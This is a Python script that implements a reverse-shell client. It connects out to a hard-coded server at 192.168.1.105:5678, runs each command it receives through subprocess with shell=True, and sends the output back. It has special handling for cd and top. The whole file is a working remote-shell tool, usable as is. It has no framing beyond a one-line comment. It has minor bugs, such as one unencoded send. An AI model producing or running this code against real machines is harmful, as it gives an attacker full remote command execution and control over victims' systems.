#will execute shell commands based on the input from server

import socket
import subprocess
import os

SERVER_IP = '192.168.1.105'
PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, PORT))
    print("Connected!")
    s.send("\nAny time your command execution seems delayed, or returns the output of a different command you entered previously, try pressing enter until you are prompted with 'shell:' again.\nUse 'exit' to close the program.\n".encode())

    while True:
        shell_cmds = s.recv(1024)

        if (shell_cmds.decode() == "exit"):
            print("The server has ended the connection.")
            break

        elif (shell_cmds.decode().startswith("cd")):
            try:
                if (shell_cmds.decode() == "cd"):
                    s.send("Please select a directory")
                else:
                    input_list = shell_cmds.decode().split()
                    if (len(input_list)) < 2:
                        s.send("Something went wrong".encode())
                    else:
                        dir = input_list[1]
                        os.chdir(dir)
                        s.send("Changed directory".encode())
            except FileNotFoundError:
                s.sendall(f'Directory {dir} does not exist'.encode())

        elif (shell_cmds.decode() == "top"):
            s.send("Please add an argument to this command\nTry 'top -n 1'\nNote after running this command, you will have to press enter until you are again prompted with the 'shell:', or your command execution will be delayed".encode())
        else:
            output = subprocess.run(shell_cmds, shell=True, stdout=subprocess.PIPE)
            s.sendall(output.stdout)

            if output.returncode == 0:
                print("Command ran successfully")
                if not output.stdout:
                    s.send("\nYour command produced no output.\nThis could be the result of a command that is not designed to produce output, or an empty file/directory.\n".encode())

            else:
                s.send("Error, something unexpected happened.".encode())
                continue

s.close()
